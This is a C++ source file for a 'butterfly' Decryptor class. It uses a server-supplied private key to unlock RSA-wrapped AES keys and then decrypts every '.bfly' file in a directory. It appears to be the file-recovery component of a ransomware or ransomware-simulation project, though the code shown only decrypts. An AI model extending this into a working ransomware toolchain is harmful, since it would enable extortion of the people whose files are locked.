
#include <memory>

#include "crypto/decryptor.h"

namespace butterfly
{

namespace hybrid
{

Decryptor::Decryptor() : _aesDecryptor(new aes::AESDecryptor())
{
    #ifdef LOGGING
    LOG_TRACE("Create class Decryptor");
    #endif
}

void Decryptor::removeDecryptedFiles()
{

    butterfly::removeFile(butterfly::ENC_CPRIVATERSA_FILENAME);
    butterfly::removeFile(butterfly::ENC_AESKEY_FILENAME);
    butterfly::removeFile(butterfly::RSA_EKIV_FILENAME);

}

bool Decryptor::getAESKeyPairFromUnencryptedFile(std::string &aeskeypair)
{
    if ( butterfly::existsFile(butterfly::UNENC_AESKEY_FILENAME) )
    {
        aeskeypair = butterfly::readBinFile(butterfly::UNENC_AESKEY_FILENAME);

        if ( !aeskeypair.empty() )
        {
            return true;
        } else
        {
            return false;
        }
    } else
    {
        return false;
    }
}

void Decryptor::setDirPath(const std::string &dirPath)
{
    _dirPath = dirPath;
}

void Decryptor::setDecryptedCPrivateRSAStr(const std::string &decryptedCPrivateRSA)
{
    _decryptedCPrivateRSA = decryptedCPrivateRSA;
}

void Decryptor::invokeDir(const std::string &dirPath)
{

    if ( _decryptedCPrivateRSA.empty() )
    {
        throw DecryptorException("Could not start the decryption process, because decrypted CPrivateRSA.pem string is empty!");
    }

    // Decrypt the AESKey.bin file and get AESKey and AESIV
    std::string aeskey, aesiv;
    decryptAESKeyPair(butterfly::ENC_AESKEY_FILENAME, aeskey, aesiv);

    // Set static AESKey and AESIV
    _aesDecryptor->setAESKey(aeskey);
    _aesDecryptor->setAESIv(aesiv);

    // Get all files from provided directory path
    auto files = DirectoryIterator::getAllFiles(dirPath);

    // Iterate over all file paths
    for (auto &file: files)
    {
        // Check if the provided file path has the .bfly extension
        if ( DirectoryIterator::getFileExtension(file) == butterfly::ENC_BFLY_FILE_ENDING )
        {
            // Compare file size with the MAX FILE SIZE
            if ( butterfly::getFileSize(file.string(), true) > butterfly::MAX_FILE_SIZE)
            {
                #ifdef LOGGING
                LOG_TRACE("Spawn a new decryption thread for file: " << file.string());
                #endif
                spawnThread(file.string());
            } else
            {
                decryptFileWithAES(file.string());
            }
        }

    }

    // Join all threads which were spawned for huge file decryption
    joinThreads();

    // Remove decryption helper files
    removeDecryptedFiles();
}

void Decryptor::decryptCPrivateRSA(const std::string &pkeyFromServer, const std::string &encCPrivateRSAFile)
{

    _rsaDecryptorCPrivateRSA = std::unique_ptr<rsa::RSADecryptor>(new rsa::RSADecryptor(pkeyFromServer));

    try
    {
        std::string encCPrivateRSA = _rsaDecryptorCPrivateRSA->readEncMSGFromFile(encCPrivateRSAFile);
        EVP_PKEY *CPrivateRSAPKey = _rsaDecryptorCPrivateRSA->getEvpPkey();

        _rsaDecryptorCPrivateRSA->decryptEVP(CPrivateRSAPKey, encCPrivateRSA, _decryptedCPrivateRSA, butterfly::RSAKEY_TYPE::CPRIVATE_RSA);
        //_rsaDecryptorCPrivateRSA->decrypt(CPrivateRSAPKey, encCPrivateRSA, _decryptedCPrivateRSA);
        #ifdef LOGGING
        LOG_TRACE("Decrypted CPrivateRSA: " << _decryptedCPrivateRSA << " with length of " << _decryptedCPrivateRSA.length());
        #endif
        //std::cout << "Decrypted CPrivateRSA: " << _decryptedCPrivateRSA << std::endl;

    } catch (RSADecryptionException &e)
    {
        // Throw Decryptor Exception because it makes no sense to continue
        throw DecryptorException(e.what());
    }

    // Check if string is empty
    if ( _decryptedCPrivateRSA.empty() )
    {
        throw DecryptorException("Decrypted CPrivateRSA String is empty!");
    }

    // Check if decryption was successful
    if (_decryptedCPrivateRSA.find("-----BEGIN RSA PRIVATE KEY-----") == std::string::npos)
    {
        throw DecryptorException("Decrypted CPrivateRSA String does not include '-----BEGIN RSA PRIVATE KEY-----'");
    }

}

void Decryptor::decryptAESKeyPair(const std::string &filepathAESKey, std::string &decAESKey,  std::string &decAESIV)
{
    std::string aeskeypair;
    std::unique_ptr<rsa::RSADecryptor> rsaDecryptorAESKey = std::unique_ptr<rsa::RSADecryptor>(new rsa::RSADecryptor(_decryptedCPrivateRSA));

    try
    {

        std::string encAESKey = rsaDecryptorAESKey->readEncMSGFromFile(filepathAESKey);  // Length of encAESKey = encMSGLen in encrypt

        rsaDecryptorAESKey->decryptEVP(rsaDecryptorAESKey->getEvpPkey(), encAESKey, aeskeypair, butterfly::RSAKEY_TYPE::AESKEY);
        //rsaDecryptorAESKey->decrypt(rsaDecryptorAESKey->getEvpPkey(), encAESKey, aeskeypair);
        #ifdef LOGGING
        LOG_TRACE("Decrypted Content from file " << filepathAESKey << ": " << aeskeypair << " with Length: " << aeskeypair.length());
        #endif
        //std::cout << "Decrypted Content from file " << filepathAESKey << ": " << aeskeypair << " with Length: " << aeskeypair.length() << std::endl;

    } catch (RSADecryptionException &e)
    {
        std::cerr << e.what() << std::endl;

        // If error occured here, check first whether unencrypted AESKeyPair file exists
        if ( !getAESKeyPairFromUnencryptedFile(aeskeypair) )
        {
            throw DecryptorException( "Could not get AESKeyPair from unencrypted File! RSADecryptionException: " + std::string(e.what()));
        }
    }

    int aesKeyLength = _aesDecryptor->getAESKeyLength();
    int aesIVLength = _aesDecryptor->getAESIVLength();

    if ( static_cast<int>(aeskeypair.length()) < (aesKeyLength + aesIVLength) )
    {
        throw DecryptorException("AESKEYPairLength " + std::to_string(aeskeypair.length()) + " is less than " + std::to_string(aesKeyLength));
    } else
    {
        decAESKey = aeskeypair.substr(0, static_cast<unsigned long>(aesKeyLength));
        decAESIV  = aeskeypair.substr(static_cast<unsigned long>(aesKeyLength), static_cast<unsigned long>(aesIVLength));
    }

    // Check if string is empty
    if ( decAESKey.empty() )
    {
        throw DecryptorException("Decrypted " + filepathAESKey + " is empty!");
    }

    // Check if string is empty
    if ( decAESIV.empty() )
    {
        throw DecryptorException("Decrypted " + filepathAESKey + " is empty!");
    }

}

void Decryptor::decryptFileWithAES(const std::string &filepath)
{

    try
    {
        // Decrypt the file with AES
        _aesDecryptor->decryptFile(filepath);

    } catch (AESDecryptionException &e)
    {
        std::cerr << e.what() << std::endl;
        throw DecryptorException(e.what());
    }

}

void Decryptor::spawnThread(const std::string &filepath)
{
    std::thread t(&Decryptor::decryptFileWithAES, this, filepath);
    _threads.push_back(std::move(t));
}

void Decryptor::joinThreads()
{
    for (auto &t: _threads)
    {
        if (t.joinable())
            t.join();
    }
}

} // namespace hybrid

} // namespace butterfly
